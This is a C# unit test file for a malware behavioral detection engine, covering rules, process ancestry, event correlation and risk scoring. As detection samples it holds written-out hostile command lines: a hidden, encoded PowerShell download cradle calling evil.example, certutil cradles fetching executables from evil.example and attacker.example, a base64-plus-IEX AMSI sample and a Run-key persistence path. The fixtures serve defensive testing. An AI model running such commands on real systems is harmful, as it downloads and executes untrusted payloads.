using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using DataVanger.Classification;
using DataVanger.Core;
using DataVanger.Core.Abstractions;
using DataVanger.Core.Domain;
using DataVanger.Detection;
using DataVanger.Engine;
using DataVanger.Memory;
using DataVanger.Memory.Readers;
using DataVanger.Memory.Rules;
using DataVanger.Reputation;
using static DataVanger.Tests.Fixtures.PeFactory;

// Phase 09 decomposition — Behavioral Engine: rules, correlation, scoring, FP safety, stability (legacy section 18). Filter: ~Behavioral.
// Faithful verbatim move; private Assert shim -> LegacyAssert.True preserves
// condition + message. Two-way coupling check passed: no earlier-section method
// locals referenced; engine/bus/bridge/etw are block-scoped using-vars (self-contained).
public class BehavioralEngineTests
{
    private static void Assert(bool condition, string message) => LegacyAssert.True(condition, message);

    [Xunit.Fact]
    public void BehavioralEngine_AllLegacyChecks()
    {
// 18. Behavioral Engine - rules, correlation, scoring, FP safety, stability
// ============================================================================

// 18a. Command line analyzer - tag emission
var psFindings = DataVanger.Behavioral.Monitors.CommandLineAnalyzer.Analyze(
    "powershell.exe",
    J("powershell.exe -NoP -W Hidden -Encoded", "Command SGVsbG8= -ep bypass; ",
      "I", "EX (", "New-Object ", "Net.", "WebClient).Download", "String('https://evil.example/p.ps1')"));
Assert(psFindings.IsScriptHost && psFindings.HasTag("encoded-payload") && psFindings.HasTag("hidden-execution")
    && psFindings.HasTag("dynamic-execution"),
    "CommandLineAnalyzer must tag encoded, hidden and dynamic execution in a PowerShell command line.");

var benignPs = DataVanger.Behavioral.Monitors.CommandLineAnalyzer.Analyze(
    "powershell.exe", "Get-Process | Where-Object { $_.CPU -gt 100 } | Select-Object -First 5");
Assert(!benignPs.HasTag("encoded-payload") && !benignPs.HasTag("download-cradle")
    && !benignPs.HasTag("hidden-execution"),
    "Benign administrative PowerShell must NOT trigger encoded/download/hidden tags.");

var certutilFindings = DataVanger.Behavioral.Monitors.CommandLineAnalyzer.Analyze(
    "certutil.exe", J("certutil.exe -url", "cache -split -f https://evil.example/payload.exe c:\\users\\public\\p.exe"));
Assert(certutilFindings.IsLolbin && certutilFindings.HasTag("download-cradle"),
    "CommandLineAnalyzer must tag certutil download cradles as LOLBin abuse.");

// 18b. ProcessAncestry - track and walk
var ancestry = new DataVanger.Behavioral.ProcessAncestry(maxRetainedEnded: 8);
var root = ancestry.Track(100, 0, "winword.exe", @"C:\Office\winword.exe", "", DateTime.UtcNow.AddMinutes(-1));
ancestry.Track(200, 100, "powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell -enc ...", DateTime.UtcNow);
ancestry.Track(300, 200, "cmd.exe", @"C:\Windows\System32\cmd.exe", "cmd /c whoami", DateTime.UtcNow);
Assert(ancestry.HasAncestorNamed(300, "winword.exe"),
    "ProcessAncestry must walk up the chain and find an ancestor by name.");
Assert(!ancestry.HasAncestorNamed(300, "outlook.exe"),
    "ProcessAncestry must return false for ancestors that are not in the chain.");

// 18c. BehavioralEventBus - capacity, drop-oldest, dispatch
var diag = new System.Collections.Concurrent.ConcurrentQueue<string>();
using (var bus = new DataVanger.Behavioral.BehavioralEventBus(capacity: 4, diagnostics: s => diag.Enqueue(s)))
{
    // Block the worker dispatch with a gate so the publisher fills the queue
    // and triggers drop-oldest. We then release the gate and verify drops.
    using var gate = new System.Threading.ManualResetEventSlim(initialState: false);
    var received = new System.Collections.Concurrent.ConcurrentBag<DataVanger.Behavioral.BehavioralEvent>();
    using var sub = bus.Subscribe(e => { gate.Wait(); received.Add(e); });
    for (int i = 0; i < 50; i++)
    {
        bus.Publish(new DataVanger.Behavioral.BehavioralEvent(
            DataVanger.Behavioral.BehavioralEventKind.ProcessStart,
            pid: 1000 + i, parentPid: 0, processName: "x.exe", imagePath: "", commandLine: "",
            targetPath: "", extraTag: "", severity: DataVanger.Behavioral.BehavioralSeverity.Info,
            description: "x", timestampUtc: DateTime.UtcNow));
    }
    Assert(bus.DroppedCount > 0,
        "BehavioralEventBus must drop oldest events once capacity is exceeded.");
    Assert(bus.CurrentQueueSize <= 4,
        "BehavioralEventBus must never hold more than Capacity events.");
    gate.Set();
}

// 18d. Rules - encoded PowerShell from Office becomes High
var engineDiag = new System.Collections.Concurrent.ConcurrentQueue<string>();
using (var engine = new DataVanger.Behavioral.BehavioralEngine(new DataVanger.Behavioral.BehavioralEngineOptions
{
    BusCapacity = 256,
    TimelineCapacity = 256,
    Diagnostics = s => engineDiag.Enqueue(s),
}))
{
    DateTime t0 = DateTime.UtcNow.AddSeconds(-30);
    engine.Bus.Publish(new DataVanger.Behavioral.BehavioralEvent(
        DataVanger.Behavioral.BehavioralEventKind.ProcessStart,
        pid: 100, parentPid: 0, processName: "winword.exe",
        imagePath: @"C:\Office\winword.exe", commandLine: "",
        targetPath: "", extraTag: "", severity: DataVanger.Behavioral.BehavioralSeverity.Info,
        description: "office", timestampUtc: t0));
    engine.Bus.Publish(new DataVanger.Behavioral.BehavioralEvent(
        DataVanger.Behavioral.BehavioralEventKind.ProcessStart,
        pid: 200, parentPid: 100, processName: "powershell.exe",
        imagePath: @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        commandLine: J("powershell.exe -nop -w hidden -Encoded", "Command SGVsbG8="),
        targetPath: "", extraTag: "", severity: DataVanger.Behavioral.BehavioralSeverity.Medium,
        description: "encoded ps", timestampUtc: t0.AddSeconds(1)));
    engine.DrainNow();

    var chain = engine.Correlation.GetChainForPid(200, engine.Ancestry);
    Assert(chain != null && chain.HasAnyEvidence,
        "EncodedPowerShellRule must produce evidence and the correlation engine must record it.");
    Assert(chain!.Evidence.Any(e => e.Description.Contains("PowerShell suspeito", StringComparison.OrdinalIgnoreCase)),
        "EncodedPowerShellRule must emit an explainable description.");
    Assert(chain.Evidence.Any(e => e.Description.Contains("pai=winword.exe", StringComparison.OrdinalIgnoreCase)),
        "EncodedPowerShellRule must attribute parent process via ancestry correlation.");
    Assert(chain.Evidence.All(e => !e.CanConfirmMalware),
        "Behavioral evidence must never be ConfirmedMalware.");
    Assert(chain.Score <= RiskThresholds.High,
        "Behavioral chain score must be clamped to HighRisk band.");
}

// 18e. LOLBin abuse rule - certutil download
using (var engine = new DataVanger.Behavioral.BehavioralEngine())
{
    engine.Bus.Publish(new DataVanger.Behavioral.BehavioralEvent(
        DataVanger.Behavioral.BehavioralEventKind.ProcessStart,
        pid: 500, parentPid: 0, processName: "certutil.exe",
        imagePath: @"C:\Windows\System32\certutil.exe",
        commandLine: J("certutil.exe -url", "cache -split -f https://attacker.example/p.exe c:\\temp\\p.exe"),
        targetPath: "", extraTag: "", severity: DataVanger.Behavioral.BehavioralSeverity.Medium,
        description: "certutil", timestampUtc: DateTime.UtcNow));
    engine.DrainNow();

    var chain = engine.Correlation.GetChainForPid(500, engine.Ancestry);
    Assert(chain != null && chain.HasAnyEvidence,
        "LolbinAbuseRule must produce evidence for certutil download cradles.");
    Assert(chain!.Evidence.Any(e => e.Description.Contains("certutil", StringComparison.OrdinalIgnoreCase)),
        "LolbinAbuseRule evidence must name the LOLBin invoked.");

    // Benign certutil invocation (no abuse tags) must NOT trigger evidence.
    engine.Bus.Publish(new DataVanger.Behavioral.BehavioralEvent(
        DataVanger.Behavioral.BehavioralEventKind.ProcessStart,
        pid: 501, parentPid: 0, processName: "certutil.exe",
        imagePath: @"C:\Windows\System32\certutil.exe",
        commandLine: @"certutil -hashfile c:\path\to\report.pdf SHA256",
        targetPath: "", extraTag: "", severity: DataVanger.Behavioral.BehavioralSeverity.Info,
        description: "certutil hash", timestampUtc: DateTime.UtcNow));
    engine.DrainNow();
    var benignChain = engine.Correlation.GetChainForPid(501, engine.Ancestry);
    Assert(benignChain is null || benignChain.Evidence.Count == 0,
        "LolbinAbuseRule must NOT fire on benign certutil hashfile usage.");
}

// 18f. Persistence-after-drop correlation
using (var engine = new DataVanger.Behavioral.BehavioralEngine())
{
    DateTime t0 = DateTime.UtcNow.AddSeconds(-10);
    engine.Bus.Publish(new DataVanger.Behavioral.BehavioralEvent(
        DataVanger.Behavioral.BehavioralEventKind.ProcessStart,
        pid: 900, parentPid: 0, processName: "powershell.exe",
        imagePath: @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        commandLine: "", targetPath: "", extraTag: "",
        severity: DataVanger.Behavioral.BehavioralSeverity.Info, description: "ps",
        timestampUtc: t0));
    engine.Bus.Publish(new DataVanger.Behavioral.BehavioralEvent(
        DataVanger.Behavioral.BehavioralEventKind.FileDropped,
        pid: 900, parentPid: 0, processName: "powershell.exe",
        imagePath: "", commandLine: "",
        targetPath: @"C:\Users\Public\loader.exe", extraTag: "drop",
        severity: DataVanger.Behavioral.BehavioralSeverity.Medium, description: "drop",
        timestampUtc: t0.AddSeconds(1)));
    engine.Bus.Publish(new DataVanger.Behavioral.BehavioralEvent(
        DataVanger.Behavioral.BehavioralEventKind.PersistenceCreated,
        pid: 900, parentPid: 0, processName: "powershell.exe",
        imagePath: "", commandLine: "",
        targetPath: @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\loader",
        extraTag: "runkey", severity: DataVanger.Behavioral.BehavioralSeverity.High,
        description: "persistence", timestampUtc: t0.AddSeconds(5)));
    engine.DrainNow();
    var chain = engine.Correlation.GetChainForPid(900, engine.Ancestry);
    Assert(chain != null && chain.Evidence.Any(e => e.Description.Contains("Persistência", StringComparison.OrdinalIgnoreCase)),
        "PersistenceAfterDropRule must correlate FileDropped -> PersistenceCreated within the window.");
}

// 18g. Rule engine - defensive clamp on a malicious rule trying to confirm malware
var confirmingEngine = new DataVanger.Behavioral.BehavioralRuleEngine(new[] { (DataVanger.Behavioral.IBehavioralRule)new ConfirmingRule() });
var coercedEvidence = confirmingEngine.Evaluate(new DataVanger.Behavioral.BehavioralEvent(
    DataVanger.Behavioral.BehavioralEventKind.ProcessStart, pid: 1, parentPid: 0,
    processName: "x.exe", imagePath: "", commandLine: "", targetPath: "", extraTag: "",
    severity: DataVanger.Behavioral.BehavioralSeverity.Info, description: "x",
    timestampUtc: DateTime.UtcNow), new DataVanger.Behavioral.ProcessAncestry(),
    new DataVanger.Behavioral.BehavioralTimeline());
Assert(coercedEvidence.All(e => !e.CanConfirmMalware && e.Strength != EvidenceStrength.Confirmed),
    "BehavioralRuleEngine must coerce any rule attempting to emit confirmed-malware evidence back to High.");

// 18h. Scoring integration with ScanFinding via BehavioralEngine.Apply
using (var engine = new DataVanger.Behavioral.BehavioralEngine())
{
    DateTime t0 = DateTime.UtcNow.AddSeconds(-5);
    engine.Bus.Publish(new DataVanger.Behavioral.BehavioralEvent(
        DataVanger.Behavioral.BehavioralEventKind.ProcessStart,
        pid: 4242, parentPid: 0, processName: "powershell.exe",
        imagePath: @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        commandLine: J("powershell -Encoded", "Command SGVsbG8= -nop -w hidden"),
        targetPath: "", extraTag: "",
        severity: DataVanger.Behavioral.BehavioralSeverity.Medium, description: "ps",
        timestampUtc: t0));
    engine.DrainNow();

    var behaviorFinding = new ScanFinding
    {
        Path = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        Score = RiskThresholds.Suspect,
        Evidence = new List<Evidence>(),
    };
    int added = engine.Apply(behaviorFinding);
    Assert(added > 0,
        "BehavioralEngine.Apply must add behavioral evidence/score to a matching ScanFinding.");
    Assert(behaviorFinding.Evidence.All(e => !e.CanConfirmMalware),
        "Behavioral evidence pushed into a ScanFinding must never be confirmable malware.");
    Assert(ThreatClassificationPolicy.Classify(behaviorFinding) != ThreatClass.ConfirmedMalware,
        "Behavioral evidence must never make ThreatClassificationPolicy return ConfirmedMalware.");
    Assert(!ThreatClassificationPolicy.AllowsAutomaticAction(behaviorFinding),
        "Behavioral findings must NOT authorize automatic action.");
}

// 18i. Timeline pruning - retention window expires old events
var oldTl = new DataVanger.Behavioral.BehavioralTimeline(capacity: 64, retention: TimeSpan.FromMilliseconds(50));
oldTl.Record(new DataVanger.Behavioral.BehavioralEvent(
    DataVanger.Behavioral.BehavioralEventKind.ProcessStart, pid: 1, parentPid: 0,
    processName: "a.exe", imagePath: "", commandLine: "", targetPath: "", extraTag: "",
    severity: DataVanger.Behavioral.BehavioralSeverity.Info, description: "a",
    timestampUtc: DateTime.UtcNow.AddMinutes(-5)));
Thread.Sleep(60);
var snapshotNow = oldTl.Snapshot();
Assert(snapshotNow.Count == 0,
    "BehavioralTimeline must expire events older than the retention window.");

// 18j. Persistence observer - diff publishes only new entries
using (var pbus = new DataVanger.Behavioral.BehavioralEventBus(capacity: 64))
{
    var persistEvents = new System.Collections.Concurrent.ConcurrentBag<DataVanger.Behavioral.BehavioralEvent>();
    using var psub = pbus.Subscribe(e => persistEvents.Add(e));
    var observer = new DataVanger.Behavioral.Monitors.PersistenceObserver(pbus);
    int firstNew = observer.Refresh(new[] { @"C:\Users\Public\loader.exe", @"C:\Tools\backup.exe" });
    pbus.DrainNow();
    int countAfterFirst = persistEvents.Count;
    int secondNew = observer.Refresh(new[] { @"C:\Users\Public\loader.exe", @"C:\Tools\backup.exe", @"C:\Users\Public\evil2.exe" });
    pbus.DrainNow();
    Assert(firstNew == 2 && countAfterFirst == 2,
        "PersistenceObserver must publish one event per new persistence path.");
    Assert(secondNew == 1 && persistEvents.Count == 3,
        "PersistenceObserver must only publish events for NEWLY discovered persistence paths.");
}

// 18k. AMSI adapter - encoded payload propagates through engine
using (var engine = new DataVanger.Behavioral.BehavioralEngine())
{
    var adapter = new DataVanger.Behavioral.Adapters.AmsiBehaviorAdapter(engine.Bus);
    int n = adapter.Submit("powershell", J("$x = [Convert]::From", "Base64String('SGVsbG8='); ", "I", "EX $x"), pid: 7777);
    engine.DrainNow();
    Assert(n >= 1,
        "AmsiBehaviorAdapter.Submit must publish at least one event when encoded/bypass tags are found.");
}
    }
}
